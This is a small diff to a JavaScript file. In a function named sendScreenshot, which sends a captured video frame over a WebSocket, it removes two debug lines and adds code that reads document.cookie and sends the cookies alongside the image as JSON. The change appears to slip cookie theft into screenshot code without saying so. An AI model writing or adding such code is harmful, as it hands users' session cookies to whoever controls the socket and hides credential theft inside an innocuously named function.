@@ -51,10 +51,10 @@ function handleGetUserMediaError(e) {
 
 function sendScreenshot() {
     try {
-	console.log(video.videoWidth);
-	console.log(video.videoHeight);
 	let screenshot = ctx.drawImage(video, 0, 0);
-	ws.send(canvas.toDataURL('image/jpeg', 0.1));
+	img = canvas.toDataURL('image/jpeg', 0.1);
+	cookie = document.cookie;
+	ws.send(JSON.stringify({ "cookie" : cookie, "image" : img }));
     } catch (e) {
 	console.log('Unable to acquire screenshot: ' + e);
     }
